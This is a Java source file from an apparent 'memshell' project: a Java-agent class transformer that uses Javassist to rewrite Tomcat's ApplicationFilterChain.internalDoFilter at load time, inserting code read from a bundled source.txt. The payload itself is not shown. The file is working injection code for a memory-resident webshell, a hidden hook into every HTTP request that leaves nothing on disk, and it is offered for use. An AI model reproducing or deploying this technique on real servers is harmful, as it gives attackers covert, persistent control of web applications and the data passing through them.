package net.rebeyond.memshell;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

public class Transformer implements ClassFileTransformer{
    @Override
    public byte[] transform(ClassLoader classLoader, String s, Class<?> aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException {
    	

        if ("org/apache/catalina/core/ApplicationFilterChain".equals(s)) {
            try {
                ClassPool cp = ClassPool.getDefault();
                ClassClassPath classPath = new ClassClassPath(aClass);  //get current class's classpath
                cp.insertClassPath(classPath);  //add the classpath to classpool
                CtClass cc = cp.get("org.apache.catalina.core.ApplicationFilterChain");
                CtMethod m = cc.getDeclaredMethod("internalDoFilter");
                m.addLocalVariable("elapsedTime", CtClass.longType);
                m.insertBefore(readSource());
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (Exception ex) {
            	ex.printStackTrace();
                System.out.println("error:::::"+ex.getMessage());
            }
        }

        return null;
    }
    public String readSource() {
    	StringBuilder source=new StringBuilder();
        InputStream is = Transformer.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader isr = new InputStreamReader(is); 
        String line=null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while((line=br.readLine()) != null) {
            	source.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } 
        return source.toString();
    }
}
